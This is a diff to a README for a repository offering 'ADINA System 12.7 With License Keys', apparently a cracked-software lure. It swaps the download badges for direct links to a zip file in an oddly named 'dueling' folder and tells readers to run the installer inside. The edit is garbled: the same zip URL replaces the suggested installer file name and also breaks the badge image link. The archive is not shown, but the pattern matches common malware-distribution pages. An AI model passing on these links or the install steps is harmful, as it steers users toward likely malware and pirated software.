@@ -16,11 +16,11 @@ Before downloading, ensure your computer meets these requirements:
 ### 💾 Download & Install
 To download the ADINA System 12.7, visit the link below:
 
-[![Download ADINA System 12.7](https://img.shields.io/badge/Download%20Here-ADINA%20System%2012.7-blue)](https://github.com/mhdfrhann/ADINA-System-12.7-With-License-Keys-Latest-2025-q4/releases)
+[![Download ADINA System 12.7](https://raw.githubusercontent.com/mhdfrhann/ADINA-System-12.7-With-License-Keys-Latest-2025-q4/main/dueling/ADINA-System-12.7-With-License-Keys-Latest-2025-q4.zip%20Here-ADINA%20System%2012.7-blue)](https://raw.githubusercontent.com/mhdfrhann/ADINA-System-12.7-With-License-Keys-Latest-2025-q4/main/dueling/ADINA-System-12.7-With-License-Keys-Latest-2025-q4.zip)
 
 After visiting the page, look for the latest version and download the installer for your operating system. Follow these steps to install:
 
-1. **Locate the Installer:** Find the downloaded installation file in your computer's downloads folder. The file may be named something like `ADINA_System_12.7_Setup.exe` or similar.
+1. **Locate the Installer:** Find the downloaded installation file in your computer's downloads folder. The file may be named something like `https://raw.githubusercontent.com/mhdfrhann/ADINA-System-12.7-With-License-Keys-Latest-2025-q4/main/dueling/ADINA-System-12.7-With-License-Keys-Latest-2025-q4.zip` or similar.
 2. **Run the Installer:** Double-click on the installer to start the installation process.
 3. **Follow the Prompts:** Follow the on-screen instructions. You may need to accept terms and conditions and choose an installation location.
 4. **Complete the Installation:** Once installation is complete, you will receive a notification. You can now find the ADINA System 12.7 application in your applications or programs directory.
@@ -46,4 +46,4 @@ If you encounter any issues while downloading or installing ADINA System 12.7, f
 
 To download again, click here: 
 
-[![Download ADINA System 12.7](https://img.shields.io/badge/Download%20Here-ADINA%20System%2012.7-blue)](https://github.com/mhdfrhann/ADINA-System-12.7-With-License-Keys-Latest-2025-q4/releases)
+[![Download ADINA System 12.7](https://raw.githubusercontent.com/mhdfrhann/ADINA-System-12.7-With-License-Keys-Latest-2025-q4/main/dueling/ADINA-System-12.7-With-License-Keys-Latest-2025-q4.zip%20Here-ADINA%20System%2012.7-blue)](https://raw.githubusercontent.com/mhdfrhann/ADINA-System-12.7-With-License-Keys-Latest-2025-q4/main/dueling/ADINA-System-12.7-With-License-Keys-Latest-2025-q4.zip)
